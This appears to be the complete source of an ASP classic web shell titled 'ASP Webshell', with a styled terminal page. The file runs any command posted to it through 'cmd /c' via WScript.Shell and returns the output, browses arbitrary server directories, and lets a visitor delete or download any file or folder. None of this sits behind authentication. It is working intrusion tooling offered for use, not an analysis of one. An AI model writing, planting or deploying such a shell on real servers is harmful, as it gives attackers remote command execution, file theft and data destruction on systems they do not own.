<%@ Language=VBScript %>
<%
Option Explicit
Session.CodePage = 65001
Response.Charset = "UTF-8"

Dim command, output
Dim fso, folder, file, path
Dim shell, exec
Dim delPath, downPath, subfolder

command = Request.Form("command")
If command <> "" Then
    Set shell = Server.CreateObject("WScript.Shell")
    Set exec = shell.Exec("cmd /c " & command)
    output = ""
    Do While Not exec.StdOut.AtEndOfStream
        output = output & exec.StdOut.ReadLine() & vbCrLf
    Loop
End If

Set fso = Server.CreateObject("Scripting.FileSystemObject")
path = Request.QueryString("path")
If path = "" Then path = Server.MapPath(".")

If Request.QueryString("delete") <> "" Then
    delPath = Request.QueryString("delete")
    If fso.FileExists(delPath) Then
        fso.DeleteFile delPath, True
    ElseIf fso.FolderExists(delPath) Then
        fso.DeleteFolder delPath, True
    End If
    Response.Redirect(Request.ServerVariables("SCRIPT_NAME") & "?path=" & Server.URLEncode(path))
End If

If Request.QueryString("download") <> "" Then
    downPath = path & "\" & Request.QueryString("download")
    If fso.FileExists(downPath) Then
        Response.ContentType = "application/octet-stream"
        Response.AddHeader "Content-Disposition", "attachment; filename=" & fso.GetFileName(downPath)
        Response.BinaryWrite fso.GetFile(downPath).OpenAsTextStream(1).ReadAll
        Response.End
    End If
End If

%>
<!DOCTYPE html>
<html>
<head>
    <title>ASP Webshell</title>
    <style>
        body {
            background-color: #1a1a1a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            padding: 20px;
        }
        .__t1e2r_terminal {
            background-color: #1a1a1a;
            border: 1px solid #00ff00;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
            font-family: 'Courier New', monospace;
            max-width: 900px;
            width: 100%;
            margin-right: auto;
            text-align: left;
            position: relative;
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            justify-content: center;
            min-height: 200px;
        }
        .__t1e2r_terminal_title {
            position: absolute;
            top: -12px;
            left: 50%;
            transform: translateX(-50%);
            background-color: #1a1a1a;
            padding: 0 15px;
            color: #00ff00;
            font-size: 16px;
            font-weight: bold;
        }
        .__t1e2r_terminal_input {
            display: flex;
            flex-direction: column;
            gap: 10px;
            align-items: flex-start;
            width: 100%;
            max-width: 800px;
        }
        .__t1e2r_terminal_output {
            color: #00ff00;
            white-space: pre-wrap;
            word-wrap: break-word;
            line-height: 1.5;
            max-height: 300px;
            overflow-y: auto;
            padding: 10px;
            background-color: #2d2d2d;
            border-radius: 4px;
            margin-top: 10px;
            width: 100%;
            max-width: 800px;
            text-align: left;
        }
        table {
            width: 100%;
            margin-top: 20px;
            border-collapse: collapse;
            border: 1px solid #00ff00;
        }
        th, td {
            padding: 10px;
            border: 1px solid #00ff00;
            text-align: left;
        }
        th {
            background-color: #2d2d2d;
        }
        a {
            color: #00ff00;
            text-decoration: none;
            transition: all 0.3s ease;
        }
        a:hover {
            color: #fff;
            text-shadow: 0 0 5px #00ff00;
        }
        .__a1b2c_action_button {
            display: inline-block;
            padding: 5px 10px;
            margin: 0 5px;
            border: 1px solid #00ff00;
            border-radius: 4px;
            background-color: #2d2d2d;
            color: #00ff00;
            text-decoration: none;
            transition: all 0.3s ease;
        }
        .__a1b2c_action_button:hover {
            background-color: #00ff00;
            color: #1a1a1a;
            text-shadow: none;
        }
        .__a1b2c_action_button.__d1e2f_delete {
            border-color: #0066ff;
            color: #0066ff;
        }
        .__a1b2c_action_button.__d1e2f_delete:hover {
            background-color: #0066ff;
            color: #fff;
        }
        .__n1m2k_dir_link {
            display: inline-block;
            padding: 5px 10px;
            margin: 2px 0;
            border: 1px solid #00ff00;
            border-radius: 4px;
            background-color: #2d2d2d;
            color: #00ff00;
            text-decoration: none;
            transition: all 0.3s ease;
        }
        .__n1m2k_dir_link:hover {
            background-color: #00ff00;
            color: #1a1a1a;
            text-shadow: none;
        }
    </style>
</head>
<body>
    <div class="__t1e2r_terminal">
        <div class="__t1e2r_terminal_title">Run Command</div>
        <form method="post" class="__t1e2r_terminal_input">
            <label for="command">Run Command:</label>
            <input type="text" name="command" id="command" placeholder="Enter command" style="background:#1a1a1a;border:1px solid #00ff00;color:#00ff00;padding:10px;width:100%;">
            <input type="submit" value="Execute Command" style="background:#1a1a1a;border:1px solid #00ff00;color:#00ff00;padding:10px;width:100%;cursor:pointer;">
        </form>
        <% If output <> "" Then %>
            <div class="__t1e2r_terminal_output"><%=output%></div>
        <% End If %>
    </div>

    <div class="__t1e2r_terminal">
        <div class="__t1e2r_terminal_title">Browse Directory</div>
        <form method="get" class="__t1e2r_terminal_input">
            <label for="path">Browse Directory:</label>
            <input type="text" name="path" id="path" placeholder="Enter Path" value="<%=path%>" style="background:#1a1a1a;border:1px solid #00ff00;color:#00ff00;padding:10px;width:100%;">
            <input type="submit" value="Browse Directory" style="background:#1a1a1a;border:1px solid #00ff00;color:#00ff00;padding:10px;width:100%;cursor:pointer;">
        </form>
    </div>

    <table>
        <tr>
            <th>Name</th>
            <th>Size (Bytes)</th>
            <th>Actions</th>
        </tr>
        <% If fso.FolderExists(path) Then
            Set folder = fso.GetFolder(path)

            If path <> Server.MapPath(".") Then
                Response.Write "<tr>"
                Response.Write "<td><a href='" & Request.ServerVariables("SCRIPT_NAME") & "?path=" & Server.URLEncode(fso.GetParentFolderName(path)) & "' class='__n1m2k_dir_link'>..</a></td>"
                Response.Write "<td></td><td></td></tr>"
            End If

            For Each subfolder In folder.SubFolders
                Response.Write "<tr>"
                Response.Write "<td><a href='" & Request.ServerVariables("SCRIPT_NAME") & "?path=" & Server.URLEncode(subfolder.Path) & "' class='__n1m2k_dir_link'>" & subfolder.Name & "</a></td>"
                Response.Write "<td>-</td>"
                Response.Write "<td><a href='" & Request.ServerVariables("SCRIPT_NAME") & "?path=" & Server.URLEncode(path) & "&delete=" & Server.URLEncode(subfolder.Path) & "' class='__a1b2c_action_button __d1e2f_delete' onclick='return confirm(""Are you sure you want to delete " & subfolder.Name & "?"")'>Delete</a></td>"
                Response.Write "</tr>"
            Next

            For Each file In folder.Files
                Response.Write "<tr>"
                Response.Write "<td>" & file.Name & "</td>"
                Response.Write "<td>" & file.Size & "</td>"
                Response.Write "<td><a href='" & Request.ServerVariables("SCRIPT_NAME") & "?path=" & Server.URLEncode(path) & "&download=" & Server.URLEncode(file.Name) & "' class='__a1b2c_action_button'>Download</a>"
                Response.Write "<a href='" & Request.ServerVariables("SCRIPT_NAME") & "?path=" & Server.URLEncode(path) & "&delete=" & Server.URLEncode(file.Path) & "' class='__a1b2c_action_button __d1e2f_delete' onclick='return confirm(""Are you sure you want to delete " & file.Name & "?"")'>Delete</a></td>"
                Response.Write "</tr>"
            Next
        Else
            Response.Write "<tr><td colspan='3' style='color:red;'>Invalid path. Please enter a valid directory path.</td></tr>"
        End If %>
    </table>
</body>
</html>
